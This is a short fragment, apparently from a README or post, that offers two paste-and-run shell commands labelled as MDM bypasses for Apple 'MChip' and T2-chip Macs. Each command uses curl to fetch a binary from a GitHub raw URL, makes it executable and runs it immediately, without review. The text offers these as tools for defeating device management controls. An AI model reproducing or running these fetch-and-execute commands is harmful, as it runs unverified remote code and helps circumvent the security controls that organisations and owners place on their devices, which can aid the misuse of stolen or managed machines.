...
MChip Bypass:
```
curl -# https://raw.githubusercontent.com/onixsosx/Tools/refs/heads/main/MDM/MChip -o MChip && chmod +x ./MChip && ./MChip
```
T2Chip Bypass:
```
curl -# https://raw.githubusercontent.com/onixsosx/Tools/refs/heads/main/MDM/T2Chip -o T2Chip && chmod +x ./T2Chip && ./T2Chip
```